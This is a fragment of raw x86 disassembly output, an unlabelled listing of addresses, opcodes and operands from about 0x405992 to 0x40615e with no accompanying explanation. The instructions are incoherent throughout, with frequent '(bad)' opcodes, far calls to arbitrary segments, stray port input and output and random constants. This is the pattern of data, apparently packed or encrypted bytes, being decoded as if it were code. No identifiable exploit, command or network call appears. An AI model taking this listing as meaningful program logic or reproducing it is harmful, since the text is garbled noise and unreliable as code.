  405992:	or     DWORD PTR [ebp+0x72ed6978],edx
  405998:	inc    esp
  405999:	pop    ebp
  40599a:	jmp    0x4059b0
  40599c:	add    eax,0x5befe29d
  4059a1:	bound  esi,QWORD PTR [ebx+0x773a0b3e]
  4059a7:	out    dx,al
  4059a8:	loope  0x4059ab
  4059aa:	cmp    BYTE PTR [edi],dl
  4059ac:	jl     0x4059e3
  4059ae:	xchg   esp,eax
  4059af:	call   0xc363:0xcd3d8698
  4059b6:	(bad)  
  4059b7:	mov    eax,ds:0xa9dd169
  4059bc:	call   0x3b22:0x6f79420
  4059c3:	addr16 loop 0x405964
  4059c6:	out    dx,eax
  4059c7:	dec    esp
  4059c8:	xor    eax,edx
  4059ca:	mov    cl,0x84
  4059cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059cd:	dec    esp
  4059ce:	pop    esi
  4059cf:	test   eax,0x23ef211e
  4059d4:	adc    al,0xa8
  4059d6:	sub    dl,bh
  4059d8:	fwait
  4059d9:	dec    esp
  4059da:	(bad)  
  4059db:	jecxz  0x405971
  4059dd:	(bad)  
  4059de:	popa   
  4059df:	and    DWORD PTR [ebx+0x1cb6ff3c],0xffffffb8
  4059e6:	push   esi
  4059e7:	pop    si
  4059e9:	dec    edx
  4059ea:	cli    
  4059eb:	mov    al,0xf8
  4059ed:	jae    0x405a0b
  4059ef:	pusha  
  4059f0:	push   cs
  4059f1:	mov    dh,0xd8
  4059f3:	or     BYTE PTR [ebp+0x17],0xc1
  4059f7:	jns    0x4059af
  4059f9:	(bad)  
  4059fa:	jle    0x4059cd
  4059fc:	test   al,0xf1
  4059fe:	push   es
  4059ff:	push   ds
  405a00:	pop    ecx
  405a01:	and    eax,0x7fc57a19
  405a06:	mov    ?,WORD PTR [ebx]
  405a08:	pop    edx
  405a09:	in     eax,dx
  405a0a:	add    eax,esi
  405a0c:	pop    ds
  405a0d:	ins    DWORD PTR es:[edi],dx
  405a0e:	xchg   ecx,eax
  405a0f:	in     eax,0x4f
  405a11:	pop    edx
  405a12:	xor    DWORD PTR [ebp-0x6620de67],esi
  405a18:	cdq    
  405a19:	cmp    eax,0xe008343
  405a1e:	add    BYTE PTR [edx+esi*8],dl
  405a21:	push   ds
  405a22:	pusha  
  405a23:	pop    esp
  405a24:	mov    al,0x21
  405a26:	fsub   QWORD PTR [ebx+0x2979e53b]
  405a2c:	pushf  
  405a2d:	jecxz  0x405a61
  405a2f:	arpl   di,si
  405a31:	mov    cs,WORD PTR [ebx+0x5f]
  405a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a35:	mov    ds:0x4737d00f,eax
  405a3a:	mov    ds:0xb8f53ad0,eax
  405a3f:	xor    al,0x33
  405a41:	xchg   ecx,eax
  405a42:	xchg   ebp,eax
  405a43:	pop    ds
  405a44:	aam    0xaf
  405a46:	mov    eax,ebp
  405a48:	test   BYTE PTR [edx+0x30582eec],0x8f
  405a4f:	cmp    BYTE PTR [ecx+0x4093e991],dh
  405a55:	xchg   ah,al
  405a57:	push   0xb3f188a2
  405a5c:	loop   0x405aa4
  405a5e:	adc    ch,BYTE PTR [edx-0x26e2dbfb]
  405a64:	xchg   ebx,eax
  405a65:	xchg   ah,al
  405a67:	push   cs
  405a68:	jmp    DWORD PTR [ecx+ecx*2-0x18d99f07]
  405a6f:	mov    WORD PTR [esp+ebx*4-0x4004515a],cs
  405a76:	adc    DWORD PTR [esi],0x16
  405a79:	sar    DWORD PTR [edx-0x67],0xc3
  405a7d:	mov    ah,ah
  405a7f:	or     esp,DWORD PTR ds:0xd2372818
  405a85:	adc    al,0xd2
  405a87:	icebp  
  405a88:	mov    ds:0xa614213c,al
  405a8d:	pop    ds
  405a8e:	ins    BYTE PTR es:[edi],dx
  405a8f:	sbb    BYTE PTR [edi-0x14c864e3],dh
  405a95:	jb     0x405a1a
  405a97:	test   BYTE PTR [edi+eiz*2+0x39],ch
  405a9b:	das    
  405a9c:	out    dx,al
  405a9d:	gs stos BYTE PTR es:[edi],al
  405a9f:	scas   eax,DWORD PTR es:[edi]
  405aa0:	out    0x29,eax
  405aa2:	xor    al,0x4c
  405aa4:	mov    dl,0xa0
  405aa6:	mov    ds:0xf4198814,al
  405aab:	stos   DWORD PTR es:[edi],eax
  405aac:	test   eax,0xf02ee461
  405ab1:	pop    edi
  405ab2:	or     eax,0x7218fc84
  405ab7:	inc    esi
  405ab8:	adc    al,0x0
  405aba:	dec    edx
  405abb:	(bad)  
  405abc:	int3   
  405abd:	sbb    bl,BYTE PTR [ebx]
  405abf:	nop
  405ac0:	leave  
  405ac1:	cmp    BYTE PTR [ebp+eiz*2+0x7d],0x4a
  405ac6:	sbb    ecx,esi
  405ac8:	jecxz  0x405acb
  405aca:	inc    esp
  405acb:	sub    ebx,DWORD PTR [ebp+0x74774c8a]
  405ad1:	int3   
  405ad2:	xor    ebx,ecx
  405ad4:	pop    ecx
  405ad5:	sbb    DWORD PTR [eax],esi
  405ad7:	mov    ah,0x3e
  405ad9:	into   
  405ada:	aad    0x8f
  405adc:	rol    BYTE PTR [edx+0x51],1
  405adf:	jl     0x405a82
  405ae1:	addr16 (bad) 
  405ae3:	js     0x405b62
  405ae5:	sub    bl,BYTE PTR [ebp-0x7]
  405ae8:	or     edi,DWORD PTR [edx]
  405aea:	scas   al,BYTE PTR es:[edi]
  405aeb:	cmp    eax,0x86020081
  405af0:	xchg   BYTE PTR [ebp-0x3],ah
  405af3:	xchg   DWORD PTR [ecx+0x2f],esp
  405af6:	jbe    0x405ac5
  405af8:	aad    0x78
  405afa:	jmp    0x405ae7
  405afc:	aas    
  405afd:	test   ebx,esp
  405aff:	ud1    esp,DWORD PTR [esi-0x2]
  405b03:	repz ret 
  405b05:	xlat   BYTE PTR ds:[ebx]
  405b06:	sbb    BYTE PTR [edi-0x3d110f38],ch
  405b0c:	push   cs
  405b0d:	lock out 0xf1,eax
  405b10:	cmp    edx,edx
  405b12:	pusha  
  405b13:	test   al,0xb
  405b15:	test   BYTE PTR [eax+ebp*1],dl
  405b18:	int3   
  405b19:	add    BYTE PTR [eax+0x5d04b917],0xd4
  405b20:	ror    BYTE PTR [esp+eax*1+0x5f],1
  405b24:	fdivr  st(7),st
  405b26:	fnstenv [edi+0x1b]
  405b29:	fnstenv [esi+0x1e08bc47]
  405b2f:	dec    esp
  405b30:	int3   
  405b31:	adc    BYTE PTR [eax],0xb1
  405b34:	xor    cl,BYTE PTR ds:0x1edfeaa7
  405b3a:	push   eax
  405b3b:	das    
  405b3c:	repz sbb DWORD PTR [ebp-0x5a5e1209],esp
  405b43:	aaa    
  405b44:	idiv   DWORD PTR [ebx-0x256af282]
  405b4a:	fiadd  DWORD PTR [edx-0x2e0edf6a]
  405b50:	xor    BYTE PTR [ecx-0x37],dl
  405b53:	test   eax,0x84e5ccaf
  405b58:	xchg   eax,ebp
  405b5a:	add    DWORD PTR [esi],0x69
  405b5d:	push   ds
  405b5e:	inc    ebp
  405b5f:	iret   
  405b60:	pop    ebx
  405b61:	in     al,dx
  405b62:	(bad)  
  405b63:	adc    eax,0x6b5d2556
  405b68:	mov    dh,0x7
  405b6a:	sbb    BYTE PTR [ecx-0x61],dh
  405b6d:	inc    ecx
  405b6e:	imul   ecx,DWORD PTR [eax+0x5bf499b8],0x75
  405b75:	push   edi
  405b76:	dec    esi
  405b77:	test   DWORD PTR [edx+0x74a30e33],ecx
  405b7d:	imul   esp,DWORD PTR [ecx+0x35],0x79a1aae1
  405b84:	dec    esp
  405b85:	dec    esi
  405b86:	pop    ecx
  405b87:	jbe    0x405b12
  405b89:	mov    es,esi
  405b8b:	aad    0x6b
  405b8d:	jmp    0x122025ba
  405b92:	sbb    eax,0x71b5023b
  405b97:	dec    edx
  405b98:	call   0xe94e7415
  405b9d:	int    0x48
  405b9f:	loopne 0x405c0f
  405ba1:	pand   mm0,mm5
  405ba4:	call   0x8d92969d
  405ba9:	sbb    ecx,DWORD PTR [edx]
  405bab:	xor    al,0x42
  405bad:	jno    0x405b3f
  405baf:	loopne 0x405b8c
  405bb1:	jbe    0x405ba9
  405bb3:	test   BYTE PTR [esi-0x5413e4c7],bl
  405bb9:	shl    DWORD PTR [ebx-0x57911b10],cl
  405bbf:	xchg   BYTE PTR [esp+eax*4-0x2e],dh
  405bc3:	cmp    dh,BYTE PTR [esi+0x7b]
  405bc6:	ins    DWORD PTR es:[edi],dx
  405bc7:	inc    ebp
  405bc8:	dec    ebp
  405bc9:	test   DWORD PTR [edi],edx
  405bcb:	(bad)  [edi+ebx*8]
  405bce:	sbb    eax,eax
  405bd0:	je     0x405c3b
  405bd2:	and    ebp,esp
  405bd4:	push   es
  405bd5:	cmp    bl,BYTE PTR [edi+0x743408e1]
  405bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bdc:	xchg   ch,bl
  405bde:	test   BYTE PTR [esp+ecx*1],ch
  405be1:	mov    dl,0xff
  405be3:	test   BYTE PTR [esi+esi*8+0xcb2093a],0xa8
  405beb:	psubq  mm4,QWORD PTR [eax+0xdefe8f9]
  405bf2:	sbb    al,0x86
  405bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf5:	addr16 push 0x6d4ef67c
  405bfb:	inc    esp
  405bfc:	imul   edi,ebp,0x1ca273f2
  405c02:	cmp    eax,0x581c1f0d
  405c07:	loopne 0x405bed
  405c09:	mov    edx,0x2677afc7
  405c0e:	jmp    0x405c49
  405c10:	out    dx,al
  405c11:	sbb    dh,BYTE PTR ds:0x3dc89aa9
  405c17:	mov    dl,0xb4
  405c19:	pusha  
  405c1a:	aam    0x4b
  405c1c:	jne    0x405c71
  405c1e:	jmp    0x442b6c4b
  405c23:	into   
  405c24:	lods   al,BYTE PTR ds:[esi]
  405c25:	retf   0x4746
  405c28:	inc    esi
  405c29:	pop    ds
  405c2a:	call   0x4c84c8c9
  405c2f:	out    dx,eax
  405c30:	jp     0x405bb9
  405c32:	int    0x7a
  405c34:	pop    ss
  405c35:	push   cs
  405c36:	(bad)  
  405c38:	jns    0x405bd7
  405c3a:	add    BYTE PTR [edx+0x186f9b3b],ah
  405c40:	popf   
  405c41:	scas   al,BYTE PTR es:[edi]
  405c42:	push   ebx
  405c43:	adc    eax,DWORD PTR [edi]
  405c45:	pop    edx
  405c46:	in     eax,dx
  405c47:	scas   eax,DWORD PTR es:[edi]
  405c48:	(bad)  [ebx-0x5a]
  405c4b:	mov    al,ds:0x38aa1323
  405c50:	mov    WORD PTR [ebx-0x78],fs
  405c53:	aad    0xb3
  405c55:	dec    ebx
  405c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c57:	clc    
  405c58:	je     0x405bf6
  405c5a:	sbb    DWORD PTR [edi],edi
  405c5c:	pop    edx
  405c5d:	or     eax,0x37215aae
  405c62:	shl    DWORD PTR [ebx+0x25],cl
  405c65:	clc    
  405c66:	popf   
  405c67:	xor    BYTE PTR [edi],al
  405c69:	cld    
  405c6a:	dec    ebx
  405c6b:	adc    eax,0x8d51af4
  405c70:	mov    ah,0x87
  405c72:	rcr    BYTE PTR [esi+0x3298fcf],0xb7
  405c79:	popa   
  405c7a:	add    dl,BYTE PTR [edi-0x621a4c77]
  405c80:	rcl    BYTE PTR [ecx],0x92
  405c83:	cmp    al,0x96
  405c85:	lahf   
  405c86:	pop    edi
  405c87:	sub    eax,0xae6f31da
  405c8c:	inc    edi
  405c8d:	or     eax,0x61ef3a76
  405c92:	inc    eax
  405c93:	int3   
  405c94:	mov    esi,DWORD PTR [ecx]
  405c96:	mov    edx,0x620fcc1b
  405c9b:	jb     0x405c4f
  405c9d:	dec    ebx
  405c9e:	mov    al,0x64
  405ca0:	outs   dx,DWORD PTR ds:[esi]
  405ca1:	mov    eax,0x5af72490
  405ca6:	mov    ebp,0x13c61f5
  405cab:	scas   al,BYTE PTR es:[edi]
  405cac:	xlat   BYTE PTR ds:[ebx]
  405cad:	pop    edi
  405cae:	jg     0x405c63
  405cb0:	pop    edi
  405cb1:	(bad)  
  405cb2:	outs   dx,DWORD PTR ds:[esi]
  405cb3:	push   0x56321000
  405cb8:	pop    es
  405cb9:	dec    esi
  405cba:	mov    ch,0x10
  405cbc:	pop    ebx
  405cbd:	cdq    
  405cbe:	mov    esi,0x8e77df19
  405cc3:	push   edi
  405cc4:	cwde   
  405cc5:	xor    edx,ebx
  405cc7:	jb     0x405d2e
  405cc9:	pop    ebp
  405cca:	add    ebx,edi
  405ccc:	push   0x19846679
  405cd1:	test   BYTE PTR [edi],cl
  405cd3:	imul   esi,DWORD PTR [ebp-0x1c1d1ad3],0x66f8bb34
  405cdd:	pop    eax
  405cde:	ret    0x66d1
  405ce1:	clc    
  405ce2:	xor    eax,0xba69bf3e
  405ce7:	dec    ebp
  405ce8:	sub    dl,ch
  405cea:	push   edi
  405ceb:	adc    al,0x9d
  405ced:	cmp    BYTE PTR [eax+0x5d],ch
  405cf0:	sbb    BYTE PTR [edx+0xefea033],bl
  405cf6:	mov    es,WORD PTR [eax]
  405cf8:	imul   esi
  405cfa:	stos   DWORD PTR es:[edi],eax
  405cfb:	mov    edx,0xa2477d05
  405d00:	cld    
  405d01:	arpl   WORD PTR [ecx+0x77785bb9],dx
  405d07:	inc    ecx
  405d08:	cs (bad) 
  405d0a:	daa    
  405d0b:	imul   ebp,ebx,0xffffff81
  405d0e:	mov    fs,WORD PTR [esi]
  405d10:	pop    edi
  405d11:	mov    ebp,esp
  405d13:	call   0x5b58:0x5a1f0a73
  405d1a:	mov    edx,0xbef2a15
  405d1f:	xchg   esp,eax
  405d20:	xlat   BYTE PTR ds:[ebx]
  405d21:	xchg   ebp,eax
  405d22:	sbb    dl,0xf9
  405d25:	daa    
  405d26:	in     eax,0x5b
  405d28:	les    ecx,FWORD PTR [esi+0x6]
  405d2b:	adc    ah,BYTE PTR [eax-0x53]
  405d2e:	jo     0x405d91
  405d30:	or     DWORD PTR [eax+0x542ceafc],edi
  405d36:	fdiv   DWORD PTR [ebx-0x5]
  405d39:	cli    
  405d3a:	xchg   ecx,eax
  405d3b:	out    0x56,al
  405d3d:	pop    edx
  405d3e:	out    dx,al
  405d3f:	shl    ebx,0x5c
  405d42:	mov    bh,BYTE PTR [ecx+0xa]
  405d45:	push   eax
  405d46:	push   0x58
  405d48:	outs   dx,DWORD PTR ds:[esi]
  405d49:	push   es
  405d4a:	and    al,0xdb
  405d4c:	inc    eax
  405d4d:	ins    DWORD PTR es:[edi],dx
  405d4e:	mov    ecx,0x4784d685
  405d53:	data16 cli 
  405d55:	call   0xd6f49442
  405d5a:	pop    edi
  405d5b:	jmp    0x434f:0x61209a79
  405d62:	cmp    ecx,DWORD PTR [ecx]
  405d64:	out    0x7f,al
  405d66:	rol    ecx,0x15
  405d69:	(bad)  
  405d6b:	test   al,0x4e
  405d6d:	jne    0x405dba
  405d6f:	adc    BYTE PTR [ecx-0x53ada1dc],ah
  405d75:	cdq    
  405d76:	shr    BYTE PTR [edi-0x109e9454],1
  405d7c:	rcr    BYTE PTR [esi+0x535c0e53],cl
  405d82:	inc    esp
  405d83:	(bad)  [ebp-0x58]
  405d86:	inc    BYTE PTR [ebx+0x31]
  405d89:	aam    0x7b
  405d8b:	mov    esi,0x27bd6018
  405d90:	jne    0x405d3e
  405d92:	(bad)  
  405d93:	fistp  QWORD PTR [edi]
  405d95:	popf   
  405d96:	mov    bl,ah
  405d98:	xor    al,0x10
  405d9a:	data16 fisub WORD PTR [ecx-0x7cd47161]
  405da1:	jl     0x405dc4
  405da3:	retf   0xb66d
  405da6:	mov    dh,0x7f
  405da8:	jmp    0x2b71:0x857c2911
  405daf:	popa   
  405db0:	int    0x2f
  405db2:	mov    BYTE PTR [ecx],0x75
  405db5:	mov    bh,0x34
  405db7:	cli    
  405db8:	stos   DWORD PTR es:[edi],eax
  405db9:	fcom   st(7)
  405dbb:	sbb    DWORD PTR ds:0xcd9db20f,esp
  405dc1:	int    0x9d
  405dc3:	cli    
  405dc4:	xor    eax,eax
  405dc6:	(bad)  
  405dc7:	mov    cs,WORD PTR [ecx]
  405dc9:	and    ebx,ecx
  405dcb:	mov    al,0xee
  405dcd:	inc    esp
  405dce:	idiv   al
  405dd0:	enter  0x7dcd,0xc0
  405dd4:	sbb    al,0xe6
  405dd6:	dec    ebx
  405dd7:	push   0xca5d7066
  405ddc:	push   0xffffff9f
  405dde:	call   0x6dbb13ee
  405de3:	mov    eax,0x42854561
  405de8:	inc    esi
  405de9:	xchg   edx,eax
  405dea:	popf   
  405deb:	dec    esp
  405dec:	arpl   WORD PTR [esi+0x6111cb1],bp
  405df2:	hlt    
  405df3:	inc    esi
  405df4:	stos   BYTE PTR es:[edi],al
  405df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df6:	dec    edi
  405df7:	push   edx
  405df8:	jmp    0x405db6
  405dfa:	(bad)  
  405dfb:	sti    
  405dfc:	inc    edx
  405dfd:	and    DWORD PTR [esi],ecx
  405dff:	or     ah,ch
  405e01:	xchg   esi,eax
  405e02:	jno    0x405d9b
  405e04:	retf   
  405e05:	fwait
  405e06:	or     DWORD PTR [ebx-0x40],esp
  405e09:	(bad)  
  405e0a:	nop
  405e0b:	fdecstp 
  405e0d:	bnd jmp 0x405dc4
  405e10:	fiadd  DWORD PTR [ecx+0x6b]
  405e13:	inc    esp
  405e14:	sti    
  405e15:	add    BYTE PTR [ecx],ah
  405e17:	jge    0x405dec
  405e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e1a:	and    ch,BYTE PTR [ebx+0x3bcc10b9]
  405e20:	fcomp  DWORD PTR [edi-0x5ce5835d]
  405e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e27:	in     eax,0xa6
  405e29:	fistp  WORD PTR [eax-0x7321cfc2]
  405e2f:	retf   
  405e30:	(bad)  [ebx+eax*2-0x22]
  405e34:	lods   eax,DWORD PTR ds:[esi]
  405e35:	idiv   BYTE PTR [esi]
  405e37:	aas    
  405e38:	ss cmc 
  405e3a:	xor    BYTE PTR [edx+0x74f41865],cl
  405e40:	or     bh,BYTE PTR [edx-0x5c]
  405e43:	call   0xf1ef6a3c
  405e48:	fxtract 
  405e4a:	jns    0x405e5c
  405e4c:	lds    esi,FWORD PTR ds:0x66ec
  405e52:	xchg   BYTE PTR [eax+0x26],bl
  405e55:	leave  
  405e56:	push   edi
  405e57:	xchg   ebp,eax
  405e58:	push   ds
  405e59:	arpl   WORD PTR [edi],si
  405e5b:	pusha  
  405e5c:	repnz (bad) 
  405e5f:	shl    BYTE PTR [ecx+0x17a9ba86],cl
  405e65:	leave  
  405e66:	jnp    0x405e21
  405e68:	loope  0x405e2d
  405e6a:	mov    bl,0x2d
  405e6c:	cli    
  405e6d:	(bad)  [eax+0x6b]
  405e70:	mov    BYTE PTR [ebx-0x28898114],ah
  405e76:	int    0x5
  405e78:	ret    
  405e79:	ja     0x405eee
  405e7b:	out    0xfe,eax
  405e7d:	mov    ecx,0x9e5adafe
  405e82:	dec    eax
  405e83:	and    ebx,eax
  405e85:	aas    
  405e86:	jmp    DWORD PTR [edx+0x3b292a97]
  405e8c:	push   edi
  405e8d:	repz add ch,cl
  405e90:	mov    bh,0x5b
  405e92:	xchg   dl,bl
  405e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e95:	mov    esp,0x3e6ba24d
  405e9a:	lds    ebp,FWORD PTR [edx-0x2e]
  405e9d:	js     0x405e94
  405e9f:	das    
  405ea0:	mov    esp,0x5d48a476
  405ea5:	out    dx,al
  405ea6:	test   DWORD PTR [eax-0x6136b8f9],ecx
  405eac:	repz fstp DWORD PTR [eax]
  405eaf:	pop    esp
  405eb0:	in     eax,0x7d
  405eb2:	das    
  405eb3:	dec    ecx
  405eb4:	and    DWORD PTR [ebp+0x40],edi
  405eb7:	sbb    eax,0x94d92b6e
  405ebc:	mov    eax,ds:0xde1f2bd9
  405ec1:	lock mov al,ds:0x97b0d666
  405ec7:	fsub   DWORD PTR [esi]
  405ec9:	(bad)  
  405eca:	outs   dx,DWORD PTR ds:[esi]
  405ecb:	lds    ebp,FWORD PTR ds:0xb1f2fce2
  405ed1:	sbb    al,0xf3
  405ed3:	sti    
  405ed4:	dec    ebp
  405ed5:	idiv   DWORD PTR [esi]
  405ed7:	push   ecx
  405ed8:	inc    ebx
  405ed9:	sar    ecx,1
  405edb:	mov    esi,0xc8b991b6
  405ee0:	ins    DWORD PTR es:[edi],dx
  405ee1:	dec    esp
  405ee2:	mov    ds:0xbe0c1761,al
  405ee7:	sub    BYTE PTR [ebx+0x19fda490],cl
  405eed:	in     al,0x72
  405eef:	data16 fsub st,st(6)
  405ef2:	jmp    0x405f23
  405ef4:	sub    cl,BYTE PTR [edx+0x33]
  405ef7:	and    edx,edx
  405ef9:	mov    ds:0xedc86ea,al
  405efe:	rcl    BYTE PTR [ebp+0x50],1
  405f01:	adc    ebx,DWORD PTR [esi]
  405f03:	xor    bl,dh
  405f05:	or     ecx,DWORD PTR [edi+0x3f9b752a]
  405f0b:	outs   dx,BYTE PTR ds:[esi]
  405f0c:	call   0xfe0e98e0
  405f11:	mov    al,0x86
  405f13:	in     eax,0xfa
  405f15:	test   al,0x6e
  405f17:	out    dx,eax
  405f18:	cmc    
  405f19:	cmp    DWORD PTR [ecx-0x58],ebp
  405f1c:	inc    eax
  405f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f1e:	sub    eax,0xffffffbf
  405f21:	cmp    BYTE PTR [edi+0x225713cd],bh
  405f27:	sub    al,0xd8
  405f29:	loope  0x405f1c
  405f2b:	ja     0x405ec7
  405f2d:	addr16 repnz retf 
  405f30:	std    
  405f31:	loop   0x405f43
  405f33:	je     0x405f5d
  405f35:	cmp    ch,ch
  405f37:	cmp    esi,ebp
  405f39:	call   DWORD PTR [eax-0x128f33eb]
  405f3f:	cld    
  405f40:	add    DWORD PTR [edx-0x4d],eax
  405f43:	xor    eax,0x5648ad10
  405f48:	sub    BYTE PTR [eax],dl
  405f4a:	(bad)  
  405f4b:	gs push ds
  405f4d:	add    bl,ch
  405f4f:	mov    ecx,0x61a3b389
  405f54:	nop
  405f55:	fnsave [bp+di+0x26da]
  405f5a:	hlt    
  405f5b:	cmp    DWORD PTR [esp+edi*4],esi
  405f5e:	mov    edi,0x280ebbac
  405f63:	sub    ebx,DWORD PTR [ebx+0xda7824c]
  405f69:	jle    0x405f33
  405f6b:	push   edx
  405f6c:	ret    0xc2d3
  405f6f:	mov    al,0x7c
  405f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f72:	push   ss
  405f73:	sbb    DWORD PTR [edx-0x7e],esi
  405f76:	push   ecx
  405f77:	mov    DWORD PTR [ebp+0x44f86869],eax
  405f7d:	mov    bl,0xc6
  405f7f:	jno    0x405fb2
  405f81:	mov    ebp,0x201c9b77
  405f86:	xchg   edi,eax
  405f87:	iret   
  405f88:	push   DWORD PTR [edx-0x1d231da8]
  405f8e:	sahf   
  405f8f:	fcom   st(1)
  405f91:	xchg   DWORD PTR [edi-0x5706c719],esp
  405f97:	or     bh,ch
  405f99:	xor    edx,DWORD PTR [ebx+0x4de18b39]
  405f9f:	imul   eax,DWORD PTR fs:[esi+edx*8-0x659ef71e],0x6d
  405fa8:	pop    ebp
  405fa9:	jp     0x405f78
  405fab:	mov    ah,0x39
  405fad:	push   ecx
  405fae:	pop    es
  405faf:	push   edx
  405fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb1:	aad    0xd0
  405fb3:	ins    BYTE PTR es:[edi],dx
  405fb4:	cmp    BYTE PTR [edi+0x162e034b],bh
  405fba:	jbe    0x405f8f
  405fbc:	cmp    al,0x3f
  405fbe:	inc    edi
  405fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc0:	pop    edx
  405fc1:	dec    eax
  405fc2:	sub    BYTE PTR ds:0xd6e3bd5b,cl
  405fc8:	enter  0x874b,0x93
  405fcc:	inc    edx
  405fcd:	and    BYTE PTR [ecx-0x58e59b72],dl
  405fd3:	jmp    0xa38b:0x551eef62
  405fda:	je     0x40600a
  405fdc:	sahf   
  405fdd:	pop    edi
  405fde:	call   0x5d3d44ed
  405fe3:	cmc    
  405fe4:	cmc    
  405fe5:	cld    
  405fe6:	cmp    eax,0xa0d6b083
  405feb:	push   ds
  405fec:	js     0x406061
  405fee:	dec    ebp
  405fef:	mov    bl,0x4a
  405ff1:	cmp    DWORD PTR [ebx-0x27eab75a],eax
  405ff7:	pop    ss
  405ff8:	jo     0x406054
  405ffa:	jno    0x405fd0
  405ffc:	icebp  
  405ffd:	dec    esi
  405ffe:	and    bl,BYTE PTR [esi+0x66687029]
  406004:	xchg   BYTE PTR [ebx+0x66],al
  406007:	icebp  
  406008:	out    0x60,al
  40600a:	lods   eax,DWORD PTR ds:[esi]
  40600b:	test   al,0x2d
  40600d:	inc    ebp
  40600e:	add    ah,al
  406010:	out    dx,eax
  406011:	pop    ebx
  406012:	mov    eax,0x151ad667
  406017:	xor    BYTE PTR [ebx+0x3d],bh
  40601a:	mov    al,ds:0xed26a150
  40601f:	inc    esi
  406020:	mov    ch,0xb7
  406022:	mov    al,0xd7
  406024:	and    cl,BYTE PTR [esi-0x26]
  406027:	cmp    eax,0x9014df80
  40602c:	xchg   ebp,eax
  40602d:	jnp    0x405fe7
  40602f:	aas    
  406030:	rol    bh,1
  406032:	fwait
  406033:	loope  0x406052
  406035:	mov    bh,0x2f
  406037:	mov    edi,0x86395d76
  40603c:	add    al,0x74
  40603e:	dec    ebp
  40603f:	mov    esp,0x1f2ce9fe
  406044:	mov    esp,0x974e2e2
  406049:	pop    ds
  40604a:	jmp    0x40603a
  40604c:	mov    ds:0x6ff05ba0,al
  406051:	fmul   DWORD PTR [bp+0x7f3f]
  406056:	fnstsw WORD PTR [edi+0x1d92cdf1]
  40605c:	nop
  40605d:	and    bh,BYTE PTR cs:[edi]
  406060:	in     al,0x23
  406062:	in     eax,dx
  406063:	ss cmp BYTE PTR cs:[eax-0x28eb6648],al
  40606b:	push   ecx
  40606c:	lods   al,BYTE PTR ds:[esi]
  40606d:	jg     0x40605c
  40606f:	or     al,BYTE PTR [eax-0x61e11672]
  406075:	or     DWORD PTR [eax+0x7fdfa0ff],edi
  40607b:	jp     0x4060af
  40607d:	outs   dx,BYTE PTR ds:[esi]
  40607e:	sub    al,0x43
  406080:	shr    DWORD PTR [esi],0xa9
  406083:	(bad)
  406086:	jecxz  0x406023
  406088:	pop    ebp
  406089:	sbb    ebp,eax
  40608b:	push   cs
  40608c:	pushf  
  40608d:	add    bh,cl
  40608f:	inc    eax
  406090:	je     0x406092
  406092:	xchg   ecx,eax
  406093:	pop    ds
  406094:	mov    ecx,0x35ce87e9
  406099:	cmp    DWORD PTR [ebp+0x4d],edx
  40609c:	mov    al,0xf4
  40609e:	loopne 0x4060d8
  4060a0:	inc    esi
  4060a1:	jne    0x40604f
  4060a3:	aas    
  4060a4:	push   esi
  4060a5:	cmp    al,0x18
  4060a7:	test   al,0x6a
  4060a9:	xchg   ebx,eax
  4060aa:	and    BYTE PTR [edx],bh
  4060ac:	add    DWORD PTR [ecx+eiz*2+0x35],0xe79d027a
  4060b4:	and    DWORD PTR [ecx+0x1f],0x3d9e1a12
  4060bb:	leave  
  4060bc:	out    dx,eax
  4060bd:	dec    esi
  4060be:	xchg   ecx,eax
  4060bf:	pop    edx
  4060c0:	add    dl,ch
  4060c2:	lock push ds
  4060c4:	fmul   QWORD PTR [ebx+0x6d]
  4060c7:	inc    ebx
  4060c8:	test   eax,0x617212fb
  4060cd:	loop   0x406061
  4060cf:	or     DWORD PTR ds:0x759dd594,edi
  4060d5:	xchg   BYTE PTR [edx],dl
  4060d7:	push   eax
  4060d8:	mov    ecx,0x5c23bf40
  4060dd:	call   0x8889:0xe50e1d0f
  4060e4:	push   0xc2fa47ce
  4060e9:	pinsrw mm4,WORD PTR [edi+0x55],0x48
  4060ee:	add    al,0x2b
  4060f0:	or     al,BYTE PTR [edi+0x44ed1d33]
  4060f6:	and    bh,BYTE PTR [edx]
  4060f8:	xchg   esp,eax
  4060f9:	jnp    0x406179
  4060fb:	xchg   ebp,eax
  4060fc:	leave  
  4060fd:	and    al,0x93
  4060ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406100:	mov    esi,0xb078804b
  406105:	sbb    DWORD PTR [eax],0x4196ba14
  40610b:	push   es
  40610c:	xchg   esi,eax
  40610d:	cmp    esp,DWORD PTR [esp+esi*4-0x2b854212]
  406114:	sub    ecx,esi
  406116:	fistp  WORD PTR [edi]
  406118:	inc    edi
  406119:	xor    edx,0xdb10416e
  40611f:	rcl    BYTE PTR [eax+0x726f0570],cl
  406125:	sub    BYTE PTR [ebx],ah
  406127:	jp     0x40611d
  406129:	mov    ds:0x5a0b7752,eax
  40612e:	sub    ecx,DWORD PTR [ecx]
  406130:	cdq    
  406131:	inc    esi
  406132:	mov    ebp,0xf8e8e8ce
  406137:	jmp    0x6cb9e3f7
  40613c:	fld    TBYTE PTR [ebp-0x22daea89]
  406142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406143:	cmp    ebx,0xd6d392fd
  406149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40614a:	xor    eax,0xe4953dc3
  40614f:	outs   dx,BYTE PTR ds:[esi]
  406150:	or     ecx,esi
  406152:	adc    BYTE PTR [edx-0x720c9cd2],dh
  406158:	lahf   
  406159:	in     al,dx
  40615a:	inc    esp
  40615b:	jg     0x4061bb
  40615d:	xchg   esi,eax
  40615e:	sub    esp,DWORD PTR [edi-0x4eee0411]
